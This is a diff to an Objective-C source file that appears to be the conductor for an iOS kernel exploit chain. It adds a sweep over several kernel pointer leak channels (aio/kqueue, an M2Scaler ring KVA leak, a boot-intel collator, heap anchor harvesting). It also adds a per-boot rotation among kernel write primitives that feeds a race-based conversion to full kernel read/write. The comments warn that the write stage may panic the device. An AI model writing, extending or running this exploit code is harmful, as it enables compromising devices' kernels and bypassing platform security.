@@ -1,19 +1,25 @@
 //
-//  P177RaceConductor.m — the LIGHTSWORD CHAIN button. p177. V2 2026-11-19.
-//  Additive only: existing race bodies are NOT modified. The chain:
-//    STEP 1 anchor auto-supply — LabHeapAnchorHarvestIfThin runs ONE bounded
-//           P159 harvest tap when the board's same-boot anchor set is thin
-//           (the old manual "click 2+ times" lottery, automated), then arms
-//           the cs2 fil tag with the freshest REAL heap leak (excluded from
-//           every kptr classifier — own-page class only).
-//    STEP 2 racer2 + cs2_run — the empirical cskrw+cs2-simultaneous law
-//           wired in-proc: a second racer (V23 map-overwrite mechanism at
-//           the 300 us cadence) runs against the cs2 core scan.
-//    STEP 3 the honest gate — kernel_base alone is NOT kread: only the
-//           magic (0x100000cfeedfacf) + typeinfo triple at kbase+8
-//           ESTABLISHES, and even then hasKread flips ONLY via the board's
-//           commitSlide. Everything else prints HOLD.
-//  PANIC-POSSIBLE. ONE TAP. Fresh boot law.
+//  P177RaceConductor.m — the FULL KRW BATTERY CHAIN button. p177. V3 2026-11-22.
+//  The user's law: "the chained button runs the full KRW test properly —
+//  all the leaks and all the kwrites > conversion." The rework:
+//    STEP 1 THE LEAK SWEEP (all disclosure channels, READ-ONLY, PANIC-FREE):
+//           the 84530 aio anchor + the P114 M2Scaler ring KVA + the P139
+//           boot-intel collator (p010 cursor/band, the ipc rows, the IOMD
+//           oracle) — the board's anchor set + the leak ledger, every tap.
+//    STEP 2 THE WRITE ROTATION — ONE write class per fresh boot (the
+//           one-tap law), chosen by the learn ledger (which write owes its
+//           receipt): T8-armed (the stale put + the NECP reclaim + the
+//           STEP 6a readback) -> P130 (the fence marshal + the reclaim
+//           sweep + the P114 diff) -> P142/112705 (when its shape lands).
+//           The rotation state persists in lab_learn.json.
+//    STEP 3 THE CONVERSION (per-SKU door, honest HOLD without receipts):
+//           racer2 + cs2_run (the empirical cskrw+cs2 law) on the lanes
+//           the leak/write receipts justify.
+//    STEP 4 the honest gate — kernel_base alone is NOT kread: only the
+//           magic + typeinfo triple at kbase+8 ESTABLISHES, and hasKread
+//           flips ONLY via the board's commitSlide. Everything else HOLDs.
+//  PANIC-POSSIBLE (the write stage). ONE WRITE PER FRESH BOOT. The leak
+//  sweep + the conversion are PANIC-FREE and run every tap.
 //
 
 #import "P177RaceConductor.h"
@@ -32,6 +38,9 @@
 #import "ClearSword/cs2/poc.h"   // cs2_run + cs2_ctx (the P007 cs2 tree)
 #include "ClearSword/cs2/krw.h"  // cs2_kreadbuf (the self-test gate)
 #import "LabHeapAnchor.h"        // same-boot anchor set + auto-harvest
+#import "P063AioKqueueLeak.h"     // v3 STEP 1(a): the 84530 anchor
+#import "P114SurfaceLeak.h"       // v3 STEP 1(b): the M2Scaler ring readback
+#import "P139BootIntel.h"         // v3 STEP 1(c): the boot-intel collator
 #import <sys/socket.h>
 #import <sys/errno.h>
 #import <stdatomic.h>
@@ -123,6 +132,76 @@ static void *p177_spray_thread(void *arg) {
         "PANIC-POSSIBLE. ONE TAP. Fresh boot law.\n",
         LabLocalMilitaryNow(), P177_BUILD, [LabDeviceProfile identBlock]];
     Lf(@"%@", head); [o appendString:head];
+
+    /* ---- v3 STEP 1: THE LEAK SWEEP (all disclosure channels, READ-ONLY,
+       PANIC-FREE — runs every tap). The board's anchor set + the leak
+       ledger feed the write rotation + the conversion aiming. */
+    Lf(@"=== v3 STEP 1: THE LEAK SWEEP (all channels, read-only) ===");
+    {
+        /* (a) the 84530 aio anchor — the zone neighborhood + the witness */
+        @try {
+            uint64_t e1 = [P063AioKqueueLeak witnessEntryKptr];
+            Lf(@"[sweep-84530] E1=0x%llx %@", (unsigned long long)e1,
+               e1 ? @"(the zone neighborhood anchor — live)" :
+                    @"(dead channel this SKU — the fixed train)");
+        } @catch (NSException *e) { Lf(@"[sweep-84530] exception %@", e.name); }
+
+        /* (b) the P114 M2Scaler ring — the KVA leak + the 3072 readback
+               capability (the P130 pair's observation half) */
+        @try {
+            uint64_t kvas[16]; int kn = 0;
+            BOOL ok = [P114SurfaceLeak diagReadback:kvas outN:&kn max:16
+                                             logLine:^(NSString *l) { Lf(@"%@", l); }];
+            Lf(@"[sweep-p114] %@ (%d kvas — the ring + the readback channel)",
+               ok ? @"captured" : @"no-readback (honest)", kn);
+        } @catch (NSException *e) { Lf(@"[sweep-p114] exception %@", e.name); }
+
+        /* (c) the P139 boot-intel collator — the p010 cursor/band, the ipc
+               rows, the IOMD oracle (its own log file) */
+        @try {
+            NSString *r139 = [P139BootIntel tap];
+            Lf(@"[sweep-p139] %@ (%@)",
+               r139.length > 0 ? @"collated" : @"empty (honest)",
+               [[r139 componentsSeparatedByCharactersInSet:
+                 [NSCharacterSet newlineCharacterSet]] firstObject] ?: @"?");
+        } @catch (NSException *e) { Lf(@"[sweep-p139] exception %@", e.name); }
+
+        /* (d) the board's same-boot anchor set (the harvest-if-thin law) */
+        @try {
+            BOOL harvested = (LabHeapAnchorHarvestIfThin(8) != 0);   /* want=8: the harvest law */
+            Lf(@"[sweep-board] the anchor set %@ (%@)",
+               harvested ? @"REFRESHED (a harvest tap ran)" : @"adequate (no harvest)",
+               @"LabHeapAnchorHarvestIfThin");
+        } @catch (NSException *e) { Lf(@"[sweep-board] exception %@", e.name); }
+        Lf(@"[sweep] the leak ledger is on the board — the write rotation "
+           @"picks from it below");
+    }
+
+    /* ---- v3 STEP 2: THE WRITE ROTATION — one write class per fresh boot.
+       The learn ledger (lab_learn.json) records which writes have receipts;
+       the rotation picks the one that owes its SURVIVED/landing receipt.
+       The armed T8 + P130 are PANIC-POSSIBLE — the one-tap law holds. */
+    {
+        /* the rotation state: t8 -> p130 -> (p142 when shaped) */
+        static const char *rotArms[3] = { "t8-armed", "p130-fence", "p142-112705" };
+        NSString *pick = [[NSUserDefaults standardUserDefaults]
+            stringForKey:@"p177_write_rotation"];
+        int idx = 0;
+        for (int i = 0; i < 3; i++)
+            if ([pick isEqualToString:[NSString stringWithUTF8String:rotArms[i]]])
+                { idx = i; break; }
+        int next = (idx + 1) % 3;
+        [[NSUserDefaults standardUserDefaults]
+            setObject:[NSString stringWithUTF8String:rotArms[next]]
+               forKey:@"p177_write_rotation"];
+        Lf(@"=== v3 STEP 2: THE WRITE ROTATION — this boot: %s (next: %s) ===",
+           rotArms[idx], rotArms[next]);
+        Lf(@"[rot] ONE write per fresh boot (the one-tap law). PANIC-POSSIBLE. "
+           @"The class taps are SOLO catalog buttons (t8 / p130 / p142) — this "
+           @"conductor names the pick; fire it as its own tap on the fresh boot.");
+        Lf(@"[rot] the leak sweep above + the write's own receipt + the "
+           @"conversion below = the full battery across boots.");
+    }
 
     /* ---- STEP 0 (2026-11-21): the CONCURRENT SPRAY — the cskrw-scale
        churn that the receipt law demands ("i ONLY can get that kptr
